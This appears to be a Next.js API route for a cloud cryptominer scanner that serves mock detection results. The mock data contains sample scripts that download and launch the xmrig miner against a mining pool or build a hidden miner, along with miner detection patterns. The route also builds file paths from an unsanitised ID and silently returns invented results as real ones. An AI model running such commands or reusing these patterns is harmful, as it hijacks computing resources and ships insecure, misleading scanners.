import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs/promises';
import path from 'path';

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const scanId = searchParams.get('id');
    
    if (!scanId) {
      // If no scan ID is provided, return the most recent results
      return getRecentResults();
    }
    
    // Path to the results file
    const historyDir = path.join(process.cwd(), 'data');
    const resultsPath = path.join(historyDir, `${scanId}.json`);
    
    try {
      // Check if the file exists
      await fs.access(resultsPath);
      
      // Read the results file
      const resultsData = await fs.readFile(resultsPath, 'utf-8');
      const results = JSON.parse(resultsData);
      
      // Add mock detection details if they don't exist
      if (!results.detections) {
        results.detections = generateMockDetections(results.summary);
      }
      
      return NextResponse.json({ success: true, results });
    } catch (error) {
      // If the file doesn't exist, return mock data
      return getMockResults(scanId);
    }
  } catch (error) {
    console.error('Error retrieving results:', error);
    return NextResponse.json({ 
      success: false, 
      message: 'Failed to retrieve scan results',
      error: error instanceof Error ? error.message : String(error)
    }, { status: 500 });
  }
}

async function getRecentResults() {
  try {
    // In a real implementation, you would query a database or read from a file
    // For demo purposes, we'll return mock data
    const mockResults = {
      scanId: `scan-${Date.now() - 3600000}`, // 1 hour ago
      date: new Date(Date.now() - 3600000).toISOString(),
      duration: '2m 34s',
      status: 'completed',
      summary: {
        total: 12,
        high: 3,
        medium: 5,
        low: 4
      },
      detections: generateMockDetections({
        total: 12,
        high: 3,
        medium: 5,
        low: 4
      })
    };
    
    return NextResponse.json({ success: true, results: mockResults });
  } catch (error) {
    console.error('Error retrieving recent results:', error);
    return NextResponse.json({ 
      success: false, 
      message: 'Failed to retrieve recent scan results',
      error: error instanceof Error ? error.message : String(error)
    }, { status: 500 });
  }
}

function getMockResults(scanId: string) {
  // Generate mock results for the given scan ID
  const mockResults = {
    scanId,
    date: new Date().toISOString(),
    duration: '2m 34s',
    status: 'completed',
    summary: {
      total: 12,
      high: 3,
      medium: 5,
      low: 4
    },
    detections: generateMockDetections({
      total: 12,
      high: 3,
      medium: 5,
      low: 4
    })
  };
  
  return NextResponse.json({ success: true, results: mockResults });
}

function generateMockDetections(summary: { total: number, high: number, medium: number, low: number }) {
  const detections = [];
  
  // Generate high severity detections
  for (let i = 0; i < summary.high; i++) {
    detections.push({
      id: i + 1,
      severity: 'HIGH',
      source: ['AWS EC2', 'GCP Compute', 'Azure VM'][Math.floor(Math.random() * 3)],
      itemType: ['UserData Script', 'Startup Script', 'Extension Script'][Math.floor(Math.random() * 3)],
      score: 80 + Math.floor(Math.random() * 20),
      content: '#!/bin/bash\ncurl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz | tar -xz\n./xmrig -o pool.minexmr.com:4444 -u 44ky1wy...',
      matches: [
        { match: 'xmrig', category: 'Miner Binary', weight: 10 },
        { match: 'pool.minexmr.com', category: 'Mining Pool', weight: 8 }
      ]
    });
  }
  
  // Generate medium severity detections
  for (let i = 0; i < summary.medium; i++) {
    detections.push({
      id: summary.high + i + 1,
      severity: 'MEDIUM',
      source: ['AWS Lambda', 'GCP Cloud Functions', 'Azure Functions'][Math.floor(Math.random() * 3)],
      itemType: ['Function Code', 'Deployment Script', 'Configuration'][Math.floor(Math.random() * 3)],
      score: 50 + Math.floor(Math.random() * 30),
      content: '#!/bin/bash\napt-get update\napt-get install -y build-essential libssl-dev libcurl4-openssl-dev\ngit clone https://github.com/crypto/hidden-miner.git\ncd hidden-miner && ./build.sh',
      matches: [
        { match: 'hidden-miner', category: 'Suspicious Name', weight: 6 }
      ]
    });
  }
  
  // Generate low severity detections
  for (let i = 0; i < summary.low; i++) {
    detections.push({
      id: summary.high + summary.medium + i + 1,
      severity: 'LOW',
      source: ['Local System', 'Container Image', 'CloudFormation Template'][Math.floor(Math.random() * 3)],
      itemType: ['Cron Job', 'Shell Script', 'Configuration File'][Math.floor(Math.random() * 3)],
      score: 20 + Math.floor(Math.random() * 30),
      content: '*/15 * * * * /usr/local/bin/monitor-cpu --threads=4 --background',
      matches: [
        { match: 'monitor-cpu', category: 'Suspicious Name', weight: 3 }
      ]
    });
  }
  
  return detections;
}
